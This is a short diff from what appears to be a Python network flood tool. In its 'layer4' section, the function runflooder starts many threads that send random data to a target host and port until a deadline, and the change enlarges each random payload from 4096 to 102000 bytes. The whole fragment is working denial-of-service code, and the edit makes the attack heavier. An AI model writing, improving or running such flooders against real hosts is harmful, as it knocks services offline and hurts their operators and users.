@@ -133,7 +133,7 @@ def get_info_l4():
 #region layer4
 def runflooder(host, port, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    rand = random._urandom(4096)
+    rand = random._urandom(102000)
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=flooder, args=(host, port, rand, until))
